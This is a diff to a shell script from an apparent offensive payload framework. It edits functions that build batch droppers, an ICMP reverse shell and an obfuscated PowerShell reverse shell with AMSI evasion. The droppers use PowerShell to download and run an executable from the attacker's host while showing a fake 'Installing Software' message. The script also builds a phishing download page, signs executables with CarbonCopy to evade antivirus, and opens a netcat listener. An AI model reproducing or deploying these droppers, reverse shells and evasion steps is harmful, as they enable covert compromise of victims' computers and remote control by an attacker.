@@ -10975,8 +10975,6 @@ fi
 
 
 
-
-
 # ----------------------------------------------------
 # build shellcode in PSH-CMD (windows BAT) ReL1K :D 
 # to use certutil.exe download/exec in hta trigger
@@ -11436,9 +11434,6 @@ if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$N4m" ]; then N4m="dropper";fi
 if [ -z "$rpath" ]; then rpath="%tmp%";fi
 if [ -z "$slave" ]; then slave="icmpsh";fi
-if [ -z "$target" ]; then echo "${RedF}[x]${white} This Module Requires Target ip addr input";sleep 3; sh_exit;fi
-
-## setting default values in case user have skip this ..
 if [ -z "$target" ]; then
    echo "${RedF}[x]${white} We must provide the [${RedF} target ${white}] ip address ([${RedF}ERR${white}])"
    sleep 3; sh_exit
@@ -11447,18 +11442,6 @@ ext=$(echo $slave|cut -c 1)
 if [ "$ext" = "f" ]; then
    echo "${RedF}[x]${white} Payload name must NOT start with [${RedF} f ${white}] character ([${RedF}ERR${white}])"
    sleep 3; sh_exit
-fi
-if [ -z "$lhost" ]; then
-   lhost="$IP"
-fi
-if [ -z "$N4m" ]; then
-   N4m="dropper"
-fi
-if [ -z "$slave" ]; then
-   slave="icmpsh"
-fi
-if [ -z "$rpath" ]; then
-   rpath="%tmp%"
 fi
 
 
@@ -11488,13 +11471,18 @@ fi
 ## Build batch dropper
 echo "[☠] Building batch dropper '$N4m.bat' ..";sleep 2
 echo "@echo off" > $IPATH/output/$N4m.bat
-echo "powershell -w 1 -C (new-Object Net.WebClient).DownloadFile('http://$lhost/$slave.exe', '$rpath\\$slave.exe') && start $rpath\\$slave.exe -t $lhost -d 500 -b 30 -s 128" >> $IPATH/output/$N4m.bat
+echo "echo Please Wait, Installing Software .." >> $IPATH/output/$N4m.bat
+echo "powershell -w 1 -C \"(new-Object Net.WebClient).DownloadFile('http://$lhost/$slave.exe', '$rpath\\$slave.exe')\" && start $rpath\\$slave.exe -t $lhost -d 500 -b 30 -s 128" >> $IPATH/output/$N4m.bat
 echo "exit" >> $IPATH/output/$N4m.bat
+
+
+## Writting ICMP reverse shell to output
+echo "[☠] Writting ICMP reverse shell to output ..";sleep 2
+cp $IPATH/bin/icmpsh/icmpsh.exe $IPATH/output/$slave.exe > /dev/nul 2>&1
 
 
 ## Copy ALL files to apache2 webroot
 echo "[☠] Porting ALL files to apache2 webroot ..";sleep 2
-cp $IPATH/bin/icmpsh/icmpsh.exe $IPATH/output/$slave.exe > /dev/nul 2>&1
 cp $IPATH/output/$slave.exe $ApAcHe/$slave.exe > /dev/nul 2>&1
 cp $IPATH/output/$N4m.bat $ApAcHe/$N4m.bat > /dev/nul 2>&1
 
@@ -12014,7 +12002,8 @@ echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','htt
 
 
 ## Build Reverse Powershell Shell
-echo "${BlueF}[☠]${white} Building Reverse Powershell Shell ..${white}";sleep 2
+echo "${BlueF}[☠]${white} Writting TCP reverse shell to output .."${Reset};
+sleep 2
 echo "<#" > $IPATH/output/$NaM.ps1
 echo "Obfuscated Reverse Powershell Shell" >> $IPATH/output/$NaM.ps1
 echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$NaM.ps1
@@ -12046,7 +12035,7 @@ echo "\$writer.close();\$socket.close();" >> $IPATH/output/$NaM.ps1
 
 ## Building Phishing webpage
 cd $IPATH/templates/phishing
-echo "${BlueF}[☠]${white} Building Downloader webpage .."${Reset};sleep 2
+echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
 sed "s|NaM3|http://$lhost/$Drop.zip|g" mega.html > mega1.html
 mv mega1.html $ApAcHe/mega1.html > /dev/nul 2>&1
 cd $IPATH
@@ -12055,7 +12044,7 @@ cd $IPATH
 ## Copy files to apache2 webroot
 cd $IPATH/output
 zip $Drop.zip $Drop.ps1 > /dev/nul 2>&1
-echo "${BlueF}[☠]${white} Porting files required to apache2 .."${Reset};sleep 2
+echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
 cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
 cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
 cd $IPATH
@@ -12070,6 +12059,7 @@ echo "${BlueF}- ATTACK VECTOR: http://$lhost/mega1.html"
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
 read odf
+rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 ## START HANDLER
 xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $lport"
 sleep 2
@@ -12080,7 +12070,7 @@ echo "${BlueF}[☠]${white} Please Wait,cleaning old files ..${white}";sleep 2
 rm $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
 rm $ApAcHe/$Drop.zip > /dev/nul 2>&1
 rm $ApAcHe/mega1.html > /dev/nul 2>&1
-# rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
+rm $IPATH/output/$NaM.ps1 > /dev/nul 2>&1
 sh_menu
 }
 
@@ -12089,7 +12079,7 @@ sh_menu
 
 # --------------------------------------------------
 # Simple TCP reverse shell in PYTHON compiled to exe
-# Author: @Rel1k
+# Author: @Rel1k (Trusted Sec)
 # --------------------------------------------------
 sh_evasion2 () {
 Colors;
@@ -12116,10 +12106,10 @@ echo "---${white}"
 
 
 ## BUILD LAUNCHER
-echo "${BlueF}[☠]${white} Building Obfuscated bat Launcher .."${Reset};sleep 2
+echo "${BlueF}[☠]${white} Building Obfuscated bat dropper ..${white}";sleep 2
 echo "@echo off" > $IPATH/output/Launcher.bat
 echo "echo Please Wait, Installing Software .." >> $IPATH/output/Launcher.bat
-echo "powershell -win 1 -C (New-Object Net.WebClient).DownloadFile('https://$lhost/$NaM.exe', '$NaM.exe') && Start $NaM.exe" >> $IPATH/output/Launcher.bat
+echo "powershell -w 1 -C \"(New-Object Net.WebClient).DownloadFile('https://$lhost/$NaM.exe', '$NaM.exe')\" && Start $NaM.exe" >> $IPATH/output/Launcher.bat
 echo "exit" >> $IPATH/output/Launcher.bat
 cd $IPATH/output
 mv Launcher.bat $NaM.bat
@@ -12127,7 +12117,7 @@ cd $IPATH
 
 
 ## Reverse TCP shell in python (ReliK Inspired)
-echo "${BlueF}[*]${white} Writting TCP reverse shell to output."${Reset};
+echo "${BlueF}[☠]${white} Writting TCP reverse shell to output .."${Reset};
 sleep 2
 echo "#!/usr/bin/python" > $IPATH/output/Client_Shell.py
 echo "# Simple Reverse TCP Shell Written by: Dave Kennedy (ReL1K)" >> $IPATH/output/Client_Shell.py
@@ -12199,7 +12189,7 @@ fi
 
 
 ## SIGN EXECUTABLE (paranoidninja - CarbonCopy)
-echo "${BlueF}[☠]${white} Sign Executable for AV Evasion .."${Reset};sleep 2
+echo "${BlueF}[☠]${white} Sign Executable for AV Evasion (CarbonCopy) .."${Reset};sleep 2
 # random produces a number from 1 to 6
 conv=$(cat /dev/urandom | tr -dc '1-6' | fold -w 1 | head -n 1)
 # if $conv number output 'its small than' number 3 ...
@@ -12215,7 +12205,7 @@ cd $IPATH/
 
 
 ## Copy files to apache2 webroot
-echo "${BlueF}[☠]${white} Copy files required to apache webroot .."${Reset};sleep 2
+echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
 cp $IPATH/output/$NaM.exe $ApAcHe/$NaM.exe > /dev/nul 2>&1
 cp $IPATH/output/$NaM.bat $ApAcHe/$NaM.bat > /dev/nul 2>&1
 rm $IPATH/output/Client_Shell.exe > /dev/nul 2>&1
@@ -12237,6 +12227,7 @@ echo "${BlueF}- ATTACK VECTOR: http://$lhost/mega1.html"
 echo "${BlueF}---"${Reset};
 echo -n "${BlueF}[☠]${white} Press any key to start a handler .."
 read odf
+rm $IPATH/output/$NaM.py > /dev/nul 2>&1
 ## START HANDLER
 xterm -T " NETCAT LISTENER - $lhost:$lport" -geometry 110x23 -e "sudo nc -lvp $lport"
 
